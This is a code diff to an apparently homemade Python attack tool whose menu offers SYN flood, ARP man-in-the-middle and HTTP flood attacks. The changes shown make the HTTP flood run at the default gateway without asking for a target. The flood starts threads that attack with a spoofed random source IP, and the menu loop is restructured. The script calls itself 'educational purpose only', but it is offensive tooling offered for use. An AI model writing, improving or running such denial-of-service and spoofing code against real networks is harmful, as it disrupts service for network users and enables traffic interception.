@@ -111,6 +111,7 @@ try:
             print(error)
 
     ##########      HTTP_attack       #########
+
     def generate_random_ip():
         fake = Faker()
         return fake.ipv4()
@@ -135,13 +136,13 @@ try:
         #target_ip = get_default_gateway()
         result = subprocess.run(["./default_gateway.sh"],capture_output=True)
         target_ip = str(result.stdout.decode())
-        targety = input(f'Would you like to set the IP address (default gateway : {target_ip})? y/n: ')
-        if targety.lower() == "y":
-            choose = int(input("\n\nChoose the IP address: "))
-            target_ip = ip_list[choose]
-            print("Target IP set to : ", target_ip)
-        else:
-            print(f'Target ip stayed as default gateway address {target_ip}')
+        #targety = input(f'Would you like to set the IP address (default gateway : {target_ip})? y/n: ')
+        #if targety.lower() == "y":
+        #    choose = int(input("\n\nChoose the IP address: "))
+        #    target_ip = ip_list[choose]
+        #    print("Target IP set to : ", target_ip)
+        #else:
+        #    print(f'Target ip stayed as default gateway address {target_ip}')
         port = 8000
         fake_ip = generate_random_ip()
         already_connected=0
@@ -149,11 +150,11 @@ try:
             thread=threading.Thread(target=attack(target_ip,port,fake_ip))
             thread.start()
 
+
 except KeyboardInterrupt:
     print("\nGOOD BYE!....")
 
 def main():
-    while True:
         print("\n1. SYN flood attack\n2. ARP MITM\n3. HTTP flood\n4. Print IP address list again\n\n")
         user_input = int(input("Choose attack script : "))
         match user_input:
@@ -164,7 +165,8 @@ def main():
         pass
 
 if __name__ == '__main__':
-    global already_connected
-    print("This script is educational purpose only!\n\n")
-    ip_list, table = info()
-    main()
+    while True:
+        global already_connected
+        print("This script is educational purpose only!\n\n")
+        ip_list, table = info()
+        main()
